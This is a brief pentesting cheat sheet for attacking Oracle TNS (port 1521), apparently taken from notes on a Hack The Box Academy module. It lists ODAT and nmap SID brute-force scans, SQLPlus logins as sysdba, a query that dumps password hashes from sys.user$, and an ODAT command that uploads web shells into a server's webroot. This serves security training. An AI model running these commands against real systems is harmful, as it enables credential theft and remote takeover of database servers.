Usual Port: 1521

Automated Tools: 

-Using ODAT to perform automated scan:
```
odat all -s <ip>
#or
./odat.py all -s <ip>
```
-Using nmap to perform automated scan:
```
sudo nmap -p<port> -sV <ip> --open --script oracle-sid-brute
```

Common Action:

-Using SQLPlus to login to Oracle TNS:
```
sqlplus <username>/<password>@<ip>/XE
```
-Using SQLPlus to login as other user:
```
sqlplus <username>/<password>@<ip>/XE as <otherusername:ex_sysdba>
```
-Extracting username and password from db:
```
#In TNS
SQL> select name, password from sys.user$;
```
-Uploading files (shells) into the system:
```
./odat.py utlfile -s <ip> -d XE -U <username> -P <password> --sysdba --putFile <path:ex_C:\\inetpub\\wwwroot> <localfilename/path> ./<destfilename>
```

Default webroot (reference):

|**OS**|**Path**|
|---|---|
|Linux|`/var/www/html`|
|Windows|`C:\inetpub\wwwroot`|

Ref: https://academy.hackthebox.com/app/module/112/section/2117